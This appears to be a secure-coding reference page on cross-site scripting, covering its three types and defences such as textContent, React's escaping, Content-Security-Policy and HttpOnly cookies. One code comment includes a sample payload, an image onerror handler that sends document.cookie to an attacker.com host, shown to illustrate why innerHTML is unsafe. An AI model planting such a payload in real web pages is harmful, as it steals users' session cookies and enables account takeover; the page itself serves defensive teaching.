# XSS (Cross-Site Scripting)

Injecting malicious JavaScript into a page other users will view, so it runs in the victim's browser with the same permissions as the legitimate site — it can steal cookies without `HttpOnly`, read tokens from `localStorage`, or make requests on behalf of the logged-in user.

## Types

- **Stored**: the payload stays saved on the server (e.g. a comment's text) and gets served to everyone who visits that page — the most dangerous, because it affects anyone with no further action from the attacker.
- **Reflected**: the payload travels in the URL or a request's body and the server returns it as-is in the response, without persisting it — requires the victim to click a link crafted by the attacker.
- **DOM-based**: the vulnerability is entirely client-side — JavaScript that takes untrusted data (the URL, an input) and puts it into the DOM without ever going through the server.

## The underlying problem: treating data as if it were code

```js
// ❌ vulnerable: the browser interprets what's inside as real HTML
element.innerHTML = userComment;
// if userComment = '<img src=x onerror="fetch(`https://attacker.com?c=${document.cookie}`)">'
// that broken image fires the script as soon as it renders

// ✅ safe: inserted as plain text, the browser doesn't execute it
element.textContent = userComment;
```

React automatically escapes any value you render as text — but `dangerouslySetInnerHTML` exists precisely to bypass that protection, and it has to be treated as a risky operation:

```jsx
// ❌ dangerouslySetInnerHTML bypasses React's automatic escaping
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// ✅ React escapes the content on its own — never interpreted as HTML
<div>{userComment}</div>
```

## How it's prevented

- **Escape by default**: any data coming from a user (or an external source) is treated as text, never as HTML, unless it's explicitly sanitized with a library built for that.
- **Content-Security-Policy**: restricts which origins the page can load/execute scripts from — mitigates the impact even if escaping fails somewhere specific (see [Security Headers](security-headers.md#content-security-policy-csp)).
- **`HttpOnly` on sensitive cookies**: doesn't prevent the XSS itself, but limits the damage — the injected script can't read a cookie the browser doesn't expose to JavaScript (see [Authentication](../backend/authentication.md#8-where-to-store-the-token-on-the-client)).

---
Related: [CSRF](csrf.md), [Security Headers](security-headers.md), [Authentication and Security](../backend/authentication.md), [Client-side storage](../frontend-react/almacenamiento-cliente.md).
